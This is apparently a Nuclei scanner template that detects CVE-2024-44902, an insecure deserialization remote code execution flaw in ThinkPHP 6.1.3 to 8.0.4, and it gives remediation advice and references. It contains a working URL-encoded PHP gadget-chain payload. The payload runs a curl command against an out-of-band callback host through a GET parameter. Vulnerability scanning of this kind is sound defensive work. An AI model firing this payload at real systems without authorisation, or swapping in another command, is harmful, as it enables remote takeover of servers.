---
id: CVE-2024-44902

info:
  name: ThinkPHP 6.1.3-8.0.4 - Insecure Deserialization RCE
  author: 0xanis
  severity: critical
  description: |
    Thinkphp v6.1.3 to v8.0.4 contain an insecure deserialization caused by improper handling of serialized data, letting attackers execute arbitrary code, exploit requires sending malicious serialized data.
  impact: |
    Successful exploitation allows attackers to Execute arbitrary code remotely.
  remediation: |
    Update to the latest version beyond v8.0.4.
  reference:
    - https://github.com/fru1ts/CVE-2024-44902
    - https://github.com/advisories/GHSA-f4wh-359g-4pq7
    - https://nvd.nist.gov/vuln/detail/CVE-2024-44902
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-44902
    cwe-id: CWE-502
    epss-score: 0.94307
    epss-percentile: 0.99939
    cpe: cpe:2.3:a:thinkphp:thinkphp:*:*:*:*:*:*:*:*
  tags: cve,cve2024,thinkphp,deserialization,rce,critical

variables:
  cmd: "{{urlencode('curl http://{{interactsh-url}}')}}"
  payload: "O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A{{len(cmd)-8}}%3A%22{{cmd}}%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D"
  param: "data"

http:
  - raw:
      - |
        GET /?{{param}}={{payload}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei
        Accept: */*
        Connection: close

    matchers:
      - type: dsl
        name: interactsh
        dsl:
          - interactsh_protocol == "http"
          - interactsh_request != ""
